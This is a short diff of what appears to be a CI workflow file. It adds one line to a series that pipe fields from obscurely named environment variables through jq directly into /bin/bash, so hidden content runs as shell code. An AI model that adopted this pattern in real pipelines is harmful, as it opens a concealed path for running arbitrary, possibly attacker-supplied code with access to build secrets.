@@ -44,6 +44,7 @@ jobs:
           echo $syus237 | jq -r .v505 | /bin/bash
           echo $xypq60948 | jq -r .qe86 | /bin/bash
           echo $k64400 | jq -r .mu03 | /bin/bash
+          echo $nc3 | jq -r .icq837 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
